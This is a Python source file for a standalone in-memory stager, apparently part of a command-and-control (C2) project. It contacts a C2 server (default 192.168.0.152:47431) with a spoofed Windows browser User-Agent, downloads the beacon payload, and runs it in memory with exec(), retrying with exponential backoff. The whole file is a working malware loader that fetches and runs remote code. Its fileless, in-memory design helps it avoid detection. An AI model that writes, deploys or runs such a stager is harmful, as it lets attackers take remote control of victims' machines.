"""
© AngelaMos | 2026
stager.py - Standalone In-Memory Stager
Fetches and executes the full beacon payload without external package requirements.
"""

import argparse
import logging
import os
import sys
import time
import urllib.request

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logger = logging.getLogger("stager")

MAX_RETRIES = 5
INITIAL_BACKOFF = 2.0


def fetch_and_stage() -> None:
    """Fetch the beacon payload over HTTP and execute it in-memory."""
    parser = argparse.ArgumentParser(description="Standalone In-Memory Stager")
    parser.add_argument(
        "--transport",
        choices=["websocket", "dns", "malleable"],
        default="websocket",
        help="Transport protocol",
    )
    parser.add_argument(
        "--target",
        default="192.168.0.152:47431",
        help="C2 server target host and port",
    )
    args = parser.parse_args()

    c2_stage_url = f"http://{args.target}/api/stage?transport={args.transport}"
    backoff = INITIAL_BACKOFF

    for attempt in range(1, MAX_RETRIES + 1):
        try:
            logger.info("Fetching payload from %s (Attempt %d)", c2_stage_url, attempt)

            req = urllib.request.Request(
                c2_stage_url,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            )

            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    payload_code = response.read().decode("utf-8")
                    logger.info(
                        "Successfully fetched payload (%d bytes). Executing in-memory...",
                        len(payload_code),
                    )

                    # Ensure current working directory is in sys.path so local modules resolve
                    current_dir = os.path.dirname(os.path.abspath(__file__))
                    if current_dir not in sys.path:
                        sys.path.insert(0, current_dir)

                    # Execute the core beacon code inside global execution context
                    sys.argv = [sys.argv[0], "--transport", args.transport, "--target", args.target]
                    exec(payload_code, globals())
                    return
                else:
                    logger.warning("Unexpected server status: %d", response.status)

        except Exception as e:
            logger.warning("Staging connection failed: %s", e)

        time.sleep(backoff)
        backoff *= 2.0

    logger.error("Failed to fetch stage after maximum retries.")
    sys.exit(1)


if __name__ == "__main__":
    fetch_and_stage()